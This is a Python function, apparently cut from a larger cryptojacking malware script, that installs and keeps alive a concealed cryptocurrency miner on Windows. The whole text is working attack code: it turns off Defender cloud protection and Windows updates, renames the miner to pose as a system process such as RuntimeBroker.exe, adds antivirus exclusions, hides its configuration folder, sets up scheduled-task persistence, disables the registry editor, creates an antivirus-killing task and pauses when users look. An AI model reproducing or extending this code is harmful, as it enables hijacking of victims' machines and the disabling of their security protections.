def run_payload():
    # Check if miner was paused by previous snooping detection
    flag_path = os.path.join(tempfile.gettempdir(), 'miner_paused.flag')
    if os.path.exists(flag_path):
        try:
            uptime = time.time() - psutil.boot_time()
            if uptime > 300:  # 5 minutes
                hawk.info("[MAIN] Stale pause flag found (uptime > 5 min), clearing and continuing.")
                os.remove(flag_path)
            else:
                hawk.info("[MAIN] Miner was paused due to user activity. Exiting.")
                sys.exit(0)
        except:
            # If we can't determine uptime, exit conservatively
            hawk.info("[MAIN] Miner was paused due to user activity. Exiting.")
            sys.exit(0)

    # Check if the miner has already been deployed via lock file
    exe_path, config_dir = check_previous_deployment()
    if exe_path:
        print("Script has already been deployed before")
        hawk.info("[MAIN] Previous deployment detected, using existing miner")
        disable_defender_cloud()
        disable_windows_updates()

        # Check if the exe is still the original name (who my pie.exe)
        if os.path.basename(exe_path).lower() == f"{EXE_NAME.lower()}.exe":
            hawk.info("[MAIN] Original miner name detected, renaming and generating config...")

            # Rename exe to a legitimate system name (same as fresh deployment)
            exe_names = [name for name in LEGIT_NAMES if name.lower().endswith('.exe')]
            if not exe_names:
                exe_names = ["RuntimeBroker.exe"]
            running_procs = set()
            try:
                tasklist_out = subprocess.run(
                    'tasklist /fo csv /nh', capture_output=True, text=True,
                    shell=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
                ).stdout.lower()
                for line in tasklist_out.splitlines():
                    parts = line.split('","')
                    if parts:
                        img = parts[0].strip('"').lower()
                        if img:
                            running_procs.add(img)
            except:
                pass
            available_names = [n for n in exe_names if n.lower() not in running_procs]
            if not available_names:
                available_names = exe_names
            new_name = random.choice(available_names)
            new_exe_path = os.path.join(os.path.dirname(exe_path), new_name)
            os.rename(exe_path, new_exe_path)
            add_folder_to_defender_exclusions(new_exe_path)
            hawk.debug(f"[RENAME] renamed to {new_name} at {new_exe_path}")

            # Make sure config_dir exists and generate config
            if not os.path.isdir(config_dir):
                config_dir = os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'),
                                          "Microsoft", "Windows", "Themes", "CachedFiles")
                os.makedirs(config_dir, exist_ok=True)
            generate_config(config_dir)

            # Update all lock files that point to the original miner (by basename match)
            for lp in LOCK_PATHS:
                if os.path.isfile(lp):
                    try:
                        with open(lp, 'r') as f:
                            lines = f.read().strip().splitlines()
                        if len(lines) >= 1 and os.path.basename(lines[0].strip()).lower() == f"{EXE_NAME.lower()}.exe":
                            # This lock file pointed to the original miner; update it
                            with open(lp, 'w') as lf:
                                lf.write(f"{new_exe_path}\n{config_dir}")
                    except:
                        pass

            exe_path = new_exe_path   # use the renamed path from now on
        else:
            # Already renamed – just ensure config is present
            if not os.path.isfile(os.path.join(config_dir, 'config.json')):
                generate_config(config_dir)

        # Start the watchdog with the (possibly renamed) exe
        watchdog = MinerWatchdog(exe_path, config_dir)
        watchdog.start()
        hawk.info("[WATCHDOG] started")
        create_scheduled_task()
        add_persistence_multi()
        disable_regedit()
        create_av_killer_task()
        try:
            while watchdog.running:
                time.sleep(1)
        except KeyboardInterrupt:
            hawk.info("[MAIN] KeyboardInterrupt received, shutting down")
        finally:
            if watchdog.miner_proc and watchdog.miner_proc.poll() is None:
                watchdog.miner_proc.terminate()
            hawk.info("[MAIN] exiting")
        sys.exit(0)

    # Ensure Defender cloud and Windows updates are off
    disable_defender_cloud()
    disable_windows_updates()

    miner_exe = find_miner_exe()
    if not miner_exe:
        hawk.critical("[PAYLOAD] miner executable not found on disk, aborting")
        trigger_exit(ERR['UNEXPECTED'], "Miner exe not found")
    if not is_pe_file(miner_exe):
        hawk.critical("[PAYLOAD] file is not a valid PE, aborting")
        trigger_exit(ERR['UNEXPECTED'], "Invalid PE file")

    # Rename exe to a legitimate system name
    hawk.info("[RENAME] selecting new name for miner")
    exe_names = [name for name in LEGIT_NAMES if name.lower().endswith('.exe')]
    if not exe_names:
        exe_names = ["RuntimeBroker.exe"]
    running_procs = set()
    try:
        tasklist_out = subprocess.run(
            'tasklist /fo csv /nh', capture_output=True, text=True,
            shell=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
        ).stdout.lower()
        for line in tasklist_out.splitlines():
            parts = line.split('","')
            if parts:
                img = parts[0].strip('"').lower()
                if img:
                    running_procs.add(img)
    except:
        pass
    available_names = [n for n in exe_names if n.lower() not in running_procs]
    if not available_names:
        available_names = exe_names
    new_name = random.choice(available_names)
    new_exe_path = os.path.join(os.path.dirname(miner_exe), new_name)
    os.rename(miner_exe, new_exe_path)
    add_folder_to_defender_exclusions(new_exe_path)
    hawk.debug(f"[RENAME] renamed to {new_name} at {new_exe_path}")

    # Config directory (hidden)
    config_dir = os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'),
                              "Microsoft", "Windows", "Themes", "CachedFiles")
    os.makedirs(config_dir, exist_ok=True)
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ctypes.windll.kernel32.SetFileAttributesW(config_dir, FILE_ATTRIBUTE_HIDDEN)
    add_folder_to_defender_exclusions(config_dir)

    generate_config(config_dir)

    # Start the watchdog (it launches the miner internally)
    watchdog = MinerWatchdog(new_exe_path, config_dir)
    watchdog.start()
    hawk.info("[WATCHDOG] started")

    # Set up persistence to run this script again on logon
    create_scheduled_task()
    add_persistence_multi()
    disable_regedit()
    create_av_killer_task()

    # Write a lock file
    lock_file = random.choice(LOCK_PATHS)
    os.makedirs(os.path.dirname(lock_file), exist_ok=True)
    with open(lock_file, 'w') as lf:
        lf.write(f"{new_exe_path}\n{config_dir}")

    hawk.info("[PAYLOAD] watchdog running, persistence established")
    # Keep the main thread alive as long as the watchdog wants to run
    try:
        while watchdog.running:
            time.sleep(1)
    except KeyboardInterrupt:
        hawk.info("[MAIN] KeyboardInterrupt received, shutting down")
    finally:
        if watchdog.miner_proc and watchdog.miner_proc.poll() is None:
            watchdog.miner_proc.terminate()
        hawk.info("[MAIN] exiting")
        sys.exit(0)

